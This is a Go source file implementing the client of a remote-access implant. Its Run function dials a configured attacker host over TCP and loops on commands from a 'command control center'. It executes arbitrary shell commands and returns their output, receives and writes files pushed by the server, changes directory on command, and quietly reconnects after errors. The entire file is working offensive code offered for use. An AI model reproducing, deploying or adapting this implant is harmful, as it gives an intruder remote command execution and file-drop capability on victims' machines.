package client

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

// BufferSize is the amount of bytes being recevied from the server
// when uploading a file
const BufferSize = 1024

// Client is
type Client struct {
	Port       int
	Target     string
	Conn       net.Conn
	ReconnTime time.Duration
}

// Run executes the payload
func (c *Client) Run() {
	addr := c.Target + ":" + strconv.Itoa(c.Port)
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Println("[ERROR] dialing connection", err)
		c.silentMode()
	}
	defer conn.Close()

	c.Conn = conn

	for {
		// commandByteBuffer is the firt 2 bytes being sent by the server
		// we grab this to check if the server is sending over any special commands
		// to upload a file or execute a program
		commandByteBuffer := make([]byte, 2)
		_, err := c.Conn.Read(commandByteBuffer)
		if err != nil {
			c.silentMode()
		}

		switch {
		case string(commandByteBuffer) == "u:":
			c.receiveFile()
			break
		case string(commandByteBuffer) == "w:":
			c.watchEvent()
			break
		case string(commandByteBuffer) == "cd":
			c.chDir(commandByteBuffer)
			break
		default:
			// Wait for a message from the command control center
			c.executeCommand(commandByteBuffer)
		}
	}
}

func (c *Client) silentMode() {
	time.Sleep(c.ReconnTime * time.Minute)

	// reconnect
	c.Run()
}

func (c *Client) watchEvent() {
	_, err := bufio.NewReader(c.Conn).ReadString('\r')
	if err != nil {
		c.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
		return
	}

	c.Conn.Write([]byte("[*] functionality not implemented yet \n\r"))
}

func (c *Client) chDir(cmd []byte) {
	dir, err := bufio.NewReader(c.Conn).ReadString('\r')
	if err != nil {
		c.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
		return
	}

	if err := os.Chdir(strings.TrimSpace(dir)); err != nil {
		c.Conn.Write([]byte("[ERROR] changing directories " + err.Error() + "\n\r"))
		return
	}

	c.Conn.Write([]byte("changed into " + dir + "\r"))
}

func (c *Client) receiveFile() {
	bufferFileName := make([]byte, 64)
	bufferFileSize := make([]byte, 10)

	c.Conn.Read(bufferFileSize)
	fileSize, err := strconv.ParseInt(strings.Trim(string(bufferFileSize), ":"), 10, 64)
	if err != nil {
		c.Conn.Write([]byte("[ERROR] converting string to int " + err.Error() + "\n\r"))
		fmt.Println(err)
		return
	}

	c.Conn.Read(bufferFileName)
	fileName := strings.Trim(string(bufferFileName), ":")

	newFile, err := os.Create(fileName)
	if err != nil {
		fmt.Println(err)
		c.Conn.Write([]byte("[ERROR] creating file " + err.Error() + "\n\r"))
		return
	}
	defer newFile.Close()

	var receivedBytes int64

	for {
		if (fileSize - receivedBytes) < BufferSize {
			io.CopyN(newFile, c.Conn, (fileSize - receivedBytes))
			break
		}
		io.CopyN(newFile, c.Conn, BufferSize)
		receivedBytes += BufferSize
	}
	c.Conn.Write([]byte("Received file completely! \n\r"))
}

func (c *Client) executeCommand(commandByteBuffer []byte) {
	// read the incoming message
	msg, err := bufio.NewReader(c.Conn).ReadString('\r')
	if err != nil {
		c.Conn.Write([]byte("[ERROR] reading the sent message " + err.Error() + "\n\r"))
		return
	}

	// fullmsg is the full message. since commandByteBuffer read the first 2 bytes
	// and this is not a special command we need those 2 bytez so we add it to the remaing
	// message from the server
	fullmsg := string(commandByteBuffer) + msg

	// Prepare the command line argument we are going to call
	cmdArgs := strings.Split(strings.TrimSpace(fullmsg), " ")
	mcmd := cmdArgs[0]
	cmdArgs = append(cmdArgs[:0], cmdArgs[0+1:]...)

	// execute the command line argument
	cmd := exec.Command(mcmd, cmdArgs...)
	output, err := cmd.Output()
	if err != nil {
		// let the server know we could not execute the command
		c.Conn.Write([]byte("Failed command: " + err.Error() + " \n\r"))
		return
	}
	// send back the command output to the server
	c.Conn.Write([]byte(string(output) + "\r"))
}
